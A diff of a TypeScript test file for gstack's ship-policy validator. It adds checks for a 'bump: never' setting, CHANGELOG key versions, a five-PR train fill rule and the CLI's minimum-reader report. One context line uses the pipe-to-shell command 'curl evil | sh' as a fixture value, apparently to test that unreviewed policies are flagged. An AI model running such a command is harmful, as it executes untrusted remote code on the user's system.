@@ -8,7 +8,7 @@ import * as fs from 'node:fs';
 import * as path from 'node:path';
 import { spawnSync } from 'node:child_process';
 import { EXIT } from '../lib/headless-artifacts';
-import { CHANGELOG_FRAGMENTS_KEY_VERSION, DEFAULT_POLICY, POLICY_KEYS, POLICY_KEY_INTRODUCED, REVIEW_SCOPE_KEY_VERSION, globToRegExp, matchesAny, validatePolicy } from '../lib/ship-policy';
+import { BUMP_NEVER_KEY_VERSION, CHANGELOG_FRAGMENTS_KEY_VERSION, DEFAULT_POLICY, POLICY_KEYS, POLICY_KEY_INTRODUCED, REVIEW_SCOPE_KEY_VERSION, globToRegExp, matchesAny, minimumReader, shipConsequences, validatePolicy } from '../lib/ship-policy';
 import { fillDue } from '../lib/ship-queue-train';
 import { cmpVersion, parseVersion } from '../lib/version-source';
 import { BASE_POLICY, cleanup, makeFixtureRepo, runBin, type FixtureRepo } from './helpers/restamp-fixture';
@@ -63,6 +63,20 @@ describe('validatePolicy (schema + containment, pure)', () => {
     expect(codes({ preregistration_shas: ['not-a-sha'] })).toEqual(['POLICY_CONTAINMENT:preregistration_shas[0]']);
   });
 
+  // Value: protects=bump never is refused without its floor (an older gstack names the cause) and next to any policy that stamps a version at every merge, reports its reader floor, and prints its Step 12 consequence; fails_when=never validates bare, or beside stamp-at-merge, train or changelog_fragments;
+  //   why_new=GST-380 added the value to an older key, which the per-key floor check skips; seam=validatePolicy, minimumReader, shipConsequences; no_claim=Step 12's behavior (test/ship-release.test.ts)
+  test('bump never needs its floor and rules out every policy that stamps at merge', () => {
+    const codes = (p: unknown) => validatePolicy(p).map(e => `${e.code}:${e.path}`);
+    const never = { bump: 'never', min_gstack_version: BUMP_NEVER_KEY_VERSION };
+    expect(codes(never)).toEqual([]);
+    expect(codes({ bump: 'never' })).toEqual(['POLICY_INVALID:bump']);
+    expect(codes({ bump: 'never', min_gstack_version: CHANGELOG_FRAGMENTS_KEY_VERSION })).toEqual(['POLICY_INVALID:bump']);
+    const train = JSON.parse(fs.readFileSync(path.join(import.meta.dir, '..', '.gstack', 'ship-policy.json'), 'utf8')).train;
+    for (const extra of [{ queue_mode: 'stamp-at-merge' }, { train }, { changelog_fragments: { dir: 'changelog.d' } }]) expect(codes({ ...never, ...extra })).toContain('POLICY_INVALID:bump');
+    expect(minimumReader({ bump: 'never' })).toBe(BUMP_NEVER_KEY_VERSION);
+    expect(shipConsequences({ ...DEFAULT_POLICY, bump: 'never' }, 'main').some(l => l.startsWith('bump never: Step 12 keeps VERSION'))).toBe(true);
+  });
+
   test('globs: ** spans directories, * stays in a segment, regex caps hold, regex metacharacters are literal', () => {
     expect(matchesAny(['docs/**/*.md'], 'docs/a/b/c.md')).toBe(true);
     expect(matchesAny(['docs/**/*.md'], 'docs/c.md')).toBe(true);
@@ -88,7 +102,7 @@ describe('policy key versions against the CHANGELOG', () => {
     const cmp = (a: number[], b: number[]) => a[0]! - b[0]! || a[1]! - b[1]! || a[2]! - b[2]! || a[3]! - b[3]!;
     const headings = [...text.matchAll(/^## \[(\d+\.\d+\.\d+\.\d+)\]/gm)].map(m => m[1]!);
     const newest = headings.map(parse).sort(cmp).at(-1)!;
-    for (const [key, version] of Object.entries(POLICY_KEY_INTRODUCED)) {
+    for (const [key, version] of [...Object.entries(POLICY_KEY_INTRODUCED), ['bump', BUMP_NEVER_KEY_VERSION]]) {
       if (headings.includes(version)) continue;
       expect(cmp(parse(version), newest), `${key} is introduced in ${version}, which has no CHANGELOG heading and is not newer than the newest heading ${newest.join('.')}; an unreleased key names the release that will stamp it`).toBeGreaterThan(0);
     }
@@ -109,7 +123,7 @@ describe('policy key versions against the CHANGELOG', () => {
     }
     const parse = (v: string) => v.split('.').map(Number);
     const cmp = (a: number[], b: number[]) => a[0]! - b[0]! || a[1]! - b[1]! || a[2]! - b[2]! || a[3]! - b[3]!;
-    for (const [key, version] of Object.entries(POLICY_KEY_INTRODUCED)) {
+    for (const [key, version] of [...Object.entries(POLICY_KEY_INTRODUCED), ['bump', BUMP_NEVER_KEY_VERSION]]) {
       if (cmp(parse(version), parse(REVIEW_SCOPE_KEY_VERSION)) < 0) continue;
       const section = sections.get(version);
       if (section === undefined) continue;
@@ -148,16 +162,17 @@ describe("gstack's own .gstack/ship-policy.json", () => {
     expect(raw.changelog_fragments.required_checks.filter((n: string) => !jobs.has(n))).toEqual([]);
   });
 
-  // Value: protects=the fill rule the coordinator relies on: a train dispatches at 3 READY PRs or one hour after the first READY, whichever comes first
-  // (2026-10-26: 5 PRs / 3 hours left READY PRs waiting most of a day); fails_when=the live block drifts back to a larger or slower fill; why_new=the values were unpinned; seam=the policy file; no_claim=fillDue's arithmetic (ship-queue-train-logic)
-  test('fills a train at 3 READY PRs or one hour after the first READY, whichever comes first', () => {
+  // Value: protects=the fill rule the coordinator relies on: a train dispatches at 5 READY PRs or one hour after the first READY, whichever comes first
+  // (2026-10-26: 5 PRs / 3 hours left READY PRs waiting most of a day, so the fill went to 3 PRs / 1 hour; 2026-10-31: Garry's B1 raised the size back to 5, keeping the 1-hour fill); fails_when=the live block drifts back to a larger or slower fill; why_new=the values were unpinned; seam=the policy file; no_claim=fillDue's arithmetic (ship-queue-train-logic)
+  test('fills a train at 5 READY PRs or one hour after the first READY, whichever comes first', () => {
     const raw = JSON.parse(fs.readFileSync(path.join(import.meta.dir, '..', '.gstack', 'ship-policy.json'), 'utf8'));
-    expect([raw.train.max_size, raw.train.fill_hours]).toEqual([3, 1]);
+    expect([raw.train.max_size, raw.train.fill_hours]).toEqual([5, 1]);
     const first = '2026-10-26T09:00:00.000Z';
     const slots = (n: number) => Array.from({ length: n }, (_, i) => ({ pr: i + 1, ready_at: new Date(Date.parse(first) + i * 60_000).toISOString() })) as any;
     expect(fillDue(slots(2), raw.train, '2026-10-26T09:59:00Z', false)).toBe('2026-10-26T10:00:00.000Z');
     expect(fillDue(slots(2), raw.train, '2026-10-26T10:00:00Z', false)).toBeNull();
-    expect(fillDue(slots(3), raw.train, '2026-10-26T09:05:00Z', false)).toBeNull();
+    expect(fillDue(slots(4), raw.train, '2026-10-26T09:05:00Z', false)).toBe('2026-10-26T10:00:00.000Z');
+    expect(fillDue(slots(5), raw.train, '2026-10-26T09:05:00Z', false)).toBeNull();
   });
 });
 
@@ -206,6 +221,15 @@ describe('gstack-ship-policy (bin)', () => {
     expect(head.policy.release_tool).toBe('curl evil | sh');
     expect(head.source.kind).toBe('head');
     expect(runBin(repo, 'gstack-ship-policy', ['show-effective', '--policy-from', 'head']).out).toMatch(/^policy: head \(unreviewed\)/);
+  });
+
+  // Value: protects=validate reports bump never's own floor as the policy's minimum reader; fails_when=the CLI prints the bump key's 1.91.73.0 and a crew upgrades to a gstack that refuses the policy;
+  //   why_new=GST-380 outside-voice review (the CLI passed introduction versions to minimumReader); seam=bin/gstack-ship-policy; no_claim=-
+  test('validate --json names bump never\'s floor as the minimum reader', () => {
+    const repo = fixture();
+    fs.writeFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), JSON.stringify({ bump: 'never', min_gstack_version: BUMP_NEVER_KEY_VERSION }) + '\n');
+    const j = JSON.parse(runBin(repo, 'gstack-ship-policy', ['validate', '--json']).out);
+    expect([j.valid, j.introduced.bump, j.min_reader]).toEqual([true, BUMP_NEVER_KEY_VERSION, BUMP_NEVER_KEY_VERSION]);
   });
 
   test('POLICY_SOURCE_UNAVAILABLE (exit 3) when origin/<base> does not resolve; no fallback to the working tree', () => {
